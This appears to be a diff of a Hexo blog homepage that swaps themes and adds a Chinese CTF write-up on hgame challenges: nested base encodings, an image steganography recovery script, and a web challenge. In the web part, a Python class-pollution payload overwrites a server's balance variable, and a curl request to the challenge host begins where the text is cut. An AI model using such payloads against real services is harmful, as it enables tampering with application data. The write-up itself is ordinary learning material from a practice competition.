@@ -1,1084 +1,977 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html lang="en">
-
-
 <head>
-    <meta charset="utf-8">
-    <meta name="keywords" content="DODOR&#39;s BLOG">
-    <meta name="description" content="DODOR&#39;s BLOG">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
 
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-    <title>DODOR&#39;s BLOG</title>
-    <link rel="icon" type="image/jpeg" href="/qingxu.jpg">
-    
-
-
-    <!-- index cover -->
-    <!-- <link rel="stylesheet preload" type="text/css" href="/css/indexcover.css"> -->
-    <style>
-        .carousel-control {
-            width: 45px;
-            height: 45px;
-            line-height: 55px;
-            border-radius: 45px;
-            background: transparent;
-            cursor: pointer;
-            z-index: 100;
-        }
-        
-        #prev-cover {
-            position: absolute;
-            top: 48%;
-            left: 8px;
-        }
-        
-        #next-cover {
-            position: absolute;
-            top: 48%;
-            right: 8px;;
-        }
-        
-        #prev-cover i {
-            margin-right: 3px;
-        }
-        
-        #next-cover i {
-            margin-left: 3px;
-        }
-        
-        .carousel-control:hover {
-            background-color: rgba(0, 0, 0, .4);
-        }
-        
-        .carousel-control i {
-            color: #fff;
-            font-size: 2.4rem;
-        }
-    </style>
+<link rel="stylesheet" href="/css/main.css">
 
 
 
-<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="/css/matery.css">
-<link rel="stylesheet" type="text/css" href="/css/my.css">
-<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dodor-ddd.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":false,"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":3,"unescape":false,"preload":true}}</script><script src="/js/config.js" defer></script>
+
+    <meta property="og:type" content="website">
+<meta property="og:title" content="DODOR&#39;s BLOG">
+<meta property="og:url" content="https://dodor-ddd.github.io/index.html">
+<meta property="og:site_name" content="DODOR&#39;s BLOG">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="DODOR">
+<meta name="twitter:card" content="summary">
 
 
+<link rel="canonical" href="https://dodor-ddd.github.io/">
 
 
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-    <link rel="stylesheet" href="/css/post.css">
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>
 
-
-
-
-
-
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
-
-<meta name="generator" content="Hexo 8.1.1"></head>
-
-
-<body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/qingxu.jpg" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">DODOR&#39;s BLOG</span>
-                </a>
-            </div>
-            
-
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DODOR's BLOG</title>
   
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>Index</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>Tags</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>Categories</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>Archives</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>About</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>Friends</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-  <li>
-    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
-      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
 
 
-<div id="mobile-nav" class="side-nav sidenav">
 
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/qingxu.jpg" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">DODOR&#39;s BLOG</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="/lib/hexo-generator-searchdb/dist/search.js" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
+  </div>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			Index
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			Tags
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			Categories
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			Archives
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			About
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			Friends
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
-    </ul>
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">DODOR's BLOG</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
 </div>
 
 
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-address-book fa-fw"></i>friends</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
         </div>
-
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
-        
-    </nav>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
 
 </header>
+        
+  
+  <aside class="sidebar">
 
-    
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
 
-
-<div class="carousel carousel-slider center index-cover" data-indicators="true" style="margin-top: -64px;">
-    
-
-    <div class="carousel-item  white-text bg-cover about-cover">
-        <div class="container">
-            <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                
-                    subtitle
-                
-            </div>
-
-            <div class="description center-align">
-                
-                <span id="subtitle"></span>
-                <script src="/libs/typed/typed.js"></script>
-                <script>
-                    var typed = new Typed("#subtitle", {
-                        strings: [ 
-                            
-                                "俄旅行く宛てを背負って生きるは――，",
-                            
-                                "短暂的旅途   背负着目的地生活。",
-                            
-                        ],
-                        startDelay: 300,
-                        typeSpeed: 100,
-                        loop: true,
-                        backSpeed: 50,
-                        showCursor: true
-                    });
-                </script>
-                
-            </div>
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
         </div>
-    </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="DODOR"
+      src="/medias/qingxu.jpg">
+  <p class="site-author-name" itemprop="name">DODOR</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
 </div>
 
-
-<script>
-    // 每天切换 banner 图.  Switch banner image every day.
-    var bannerUrl = "/medias/banner/" + new Date().getDay() + '.jpg';
-    $('.bg-cover').css('background-image', 'url(' + bannerUrl + ')');
-</script>
-<script>
-    
-      var bannerUrl = "/medias/featureimages/" + Math.floor(Math.random() * 24) + '.jpg';
-    
-    $('.bg-cover.about-cover').css('background-image', 'url(' + bannerUrl + ')');
-
-</script>
-
-
-
-            <div class="cover-btns">
-                <a href="#indexCard" class="waves-effect waves-light btn">
-                    <i class="fa fa-angle-double-down"></i>Start
-                </a>
-
-                
-                    <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light btn" target="_blank">
-                        <i class="fab fa-github "></i>Fork Me
-                    </a>
-                
-            </div>
-            <div class="cover-social-link">
-    <a href="https://github.com/dodor-ddd" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
-
-
-
-    <a href="mailto:2462856021@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2462856021" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2462856021" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-</div>
         </div>
+      </div>
     </div>
 
     
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://dodor-ddd.github.io/2026/02/27/DODOR%E7%9A%84hgame%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/medias/qingxu.jpg">
+      <meta itemprop="name" content="DODOR">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DODOR's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | DODOR's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/02/27/DODOR%E7%9A%84hgame%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">DODOR的hgame复现与知识点总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-27 20:30:15" itemprop="dateCreated datePublished" datetime="2026-02-27T20:30:15+08:00">2026-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-04-22 16:15:13" itemprop="dateModified" datetime="2026-04-22T16:15:13+08:00">2026-04-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">知识</span></a>
+        </span>
+    </span>
+
+  
 </div>
 
-<script>
-    $(function () {
-        let coverSlider = $('.carousel');
-
-        //用户触摸轮播自动 restartPlay 是否生效
-        let initUserPressedOrDraggedActive = false
-
-        //用户触摸轮播自动 restartPlay
-        function initUserPressedOrDragged(instance) {
-            setInterval(() => {
-                if (instance.pressed || instance.dragged) {
-                    // console.log('initUserPressedOrDragged: ',instance.pressed,instance.dragged)
-                    restartPlay()
-                }
-            }, 1000)
-        }
-
-        coverSlider.carousel({
-            duration: Number('120'),
-            fullWidth: true,
-            indicators: 'true' === 'true',
-            onCycleTo() {
-                if (!initUserPressedOrDraggedActive) {
-                    // console.log('initUserPressedOrDraggedActive')
-                    initUserPressedOrDragged(this)
-                    initUserPressedOrDraggedActive = true
-                }
-            },
-        })
-
-        let carouselIntervalId;
-        
-        // Loop to call the next cover article picture.
-        let autoCarousel = function () {
-            carouselIntervalId = setInterval(function () {
-                coverSlider.carousel('next');
-            }, 5000);
-        };
-        autoCarousel();
-        
-
-        function restartPlay() {
-            
-            clearInterval(carouselIntervalId);
-            autoCarousel();
-            
-        };
-
-        
-        // prev and next cover post.
-        $('#prev-cover').click(function () {
-            coverSlider.carousel('prev');
-            restartPlay();
-        });
-        $('#next-cover').click(function () {
-            coverSlider.carousel('next');
-            restartPlay();
-        });
-        
-    });
-</script>
-
-
-
-<main class="content">
-
-    
-    <div id="indexCard" class="index-card">
-        <div class="container ">
-            <div class="card">
-                <div class="card-content">
-                    
-                        <div class="dream">
-    
-    <div class="title center-align">
-        <i class="far fa-lightbulb"></i>&nbsp;&nbsp;DODOR&#39;s HOME
-    </div>
-    
-    <div class="row">
-        <div class="col l8 offset-l2 m10 offset-m1 s10 offset-s1 center-align text">
-            welcome 2 my blog! i wi1l share some personal thoughts and ideas here.
         </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>看过wp后的复现wwwww,留档做个记录。</p>
+<h2 id="打好基础"><a href="#打好基础" class="headerlink" title="打好基础"></a>打好基础</h2><p>之前一直不知道Base100就是将每个字节（8位，值域0-255）映射到一个特定的表情符号。编码表通常包含256个不同的表情符号，每个符号对应一个唯一的字节值。编码过程直接将字节流转换为表情符号序列，解码则是反向操作。</p>
+<p>例如，原始文本“Hello”（十六进制：48 65 6C 6C 6F）可能被编码为一串表情符号，如：🐟 🐠 🐡 🐡 🐢（具体符号因编码表而异）‌</p>
+<p>扔给ai识别说有85个表情自然就陷入了Base85(虽然后面还是会用到)非常明确肯定是base大家族。但是无论是从已知的形式hgame{}来看还是首字母来看都无法解密。（其实应该看到打好基础就知道是base的嵌套，当时没有想到。。。</p>
+<p>经过base100,92，91，85，64，62，58，45，32后即可得到flag。</p>
+<h2 id="shiori不想找女朋友"><a href="#shiori不想找女朋友" class="headerlink" title="shiori不想找女朋友"></a>shiori不想找女朋友</h2><p>这题完全是因为我自己的问题，直接用windows打开解压后发现只有一张图片，通过exiftool发现其中有一段json：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"block"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">"start_x"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token property">"start_y"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token property">"step_x"</span><span class="token operator">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token property">"step_y"</span><span class="token operator">:</span> <span class="token number">7</span><span class="token punctuation">,</span>
+<span class="token property">"column_num"</span><span class="token operator">:</span> <span class="token number">450</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<p>一种隐写，起始位置和步长全标出来了写脚本复原：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+
+CHALLENGE_FILE <span class="token operator">=</span> <span class="token string">"shiori.png"</span>
+
+OUTPUT_FILE <span class="token operator">=</span> <span class="token string">"key.png"</span>
+
+<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+  img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>CHALLENGE_FILE<span class="token punctuation">)</span>
+
+  b <span class="token operator">=</span> <span class="token number">1</span>
+
+  sx <span class="token operator">=</span> <span class="token number">10</span>
+
+  sy <span class="token operator">=</span> <span class="token number">10</span>
+
+  dx <span class="token operator">=</span> <span class="token number">7</span>
+
+  dy <span class="token operator">=</span> <span class="token number">7</span>
+
+  w_blocks <span class="token operator">=</span> <span class="token number">450</span>
+
+  canvas_w <span class="token operator">=</span> w_blocks <span class="token operator">*</span> b
+
+  canvas_h <span class="token operator">=</span> <span class="token number">600</span>
+
+  restored_img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>canvas_w<span class="token punctuation">,</span> canvas_h<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'lightgray'</span><span class="token punctuation">)</span>
+
+  c_w<span class="token punctuation">,</span> c_h <span class="token operator">=</span> img<span class="token punctuation">.</span>size
+
+  carrier_x<span class="token punctuation">,</span> carrier_y <span class="token operator">=</span> sx<span class="token punctuation">,</span> sy
+
+  target_col<span class="token punctuation">,</span> target_row <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>
+
+  count <span class="token operator">=</span> <span class="token number">0</span>
+
+  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+
+​    <span class="token keyword">if</span> carrier_y <span class="token operator">+</span> b <span class="token operator">></span> c_h<span class="token punctuation">:</span>
+
+​      <span class="token keyword">break</span>
+
+​    box <span class="token operator">=</span> <span class="token punctuation">(</span>carrier_x<span class="token punctuation">,</span> carrier_y<span class="token punctuation">,</span> carrier_x <span class="token operator">+</span> b<span class="token punctuation">,</span> carrier_y <span class="token operator">+</span> b<span class="token punctuation">)</span>
+
+​    block <span class="token operator">=</span> img<span class="token punctuation">.</span>crop<span class="token punctuation">(</span>box<span class="token punctuation">)</span>
+
+​    paste_x <span class="token operator">=</span> target_col <span class="token operator">*</span> b
+
+​    paste_y <span class="token operator">=</span> target_row <span class="token operator">*</span> b
+
+​    <span class="token keyword">if</span> paste_y <span class="token operator">+</span> b <span class="token operator">></span> canvas_h<span class="token punctuation">:</span> 
+
+​      <span class="token keyword">break</span>
+
+​    restored_img<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token punctuation">(</span>paste_x<span class="token punctuation">,</span> paste_y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+​    count <span class="token operator">+=</span> <span class="token number">1</span>
+
+​    target_col <span class="token operator">+=</span> <span class="token number">1</span>
+
+​    <span class="token keyword">if</span> target_col <span class="token operator">>=</span> w_blocks<span class="token punctuation">:</span>
+
+​      target_col <span class="token operator">=</span> <span class="token number">0</span>
+
+​    target_row <span class="token operator">+=</span> <span class="token number">1</span>
+
+​    carrier_x <span class="token operator">+=</span> dx
+
+​    <span class="token keyword">if</span> carrier_x <span class="token operator">+</span> b <span class="token operator">></span> c_w<span class="token punctuation">:</span>
+
+​      carrier_x <span class="token operator">=</span> sx
+
+​    carrier_y <span class="token operator">+=</span> dy
+
+  restored_img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>OUTPUT_FILE<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+
+  solve<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>(wp的脚本，更加简洁)<br>然后组成图片如下</p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/reconstructed_hidden.png"></p>
+<p>然后就可以解密拿到一个其实是png的jpg了，我们用convert把他转化成jpg，alpha通道会自动丢弃得到flag。(以后我一定先查附件本身压缩(哭))</p>
+<h2 id="VIDARSHOP"><a href="#VIDARSHOP" class="headerlink" title="VIDARSHOP"></a>VIDARSHOP</h2><p>我那个时候其实注意力全放在jwt上了，以为是jwt弱密钥爆破，结果jwt里面带的是usename而且也不靠他来检验身份，做了很多无用功(😂)，原来不是窃取管理员身份,而是借助管理员id改我自己的钱。有考虑过原型链污染，但是uid的生成逻辑我完全没想到。</p>
+<p>这题根据提示需要我们覆盖balance的值，同时有一个&#x2F;api&#x2F;update的端口通过</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>访问全局变量balance并覆盖：以下是payload:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST http://forward.vidar.club:32530/api/update <span class="token punctuation">\</span>
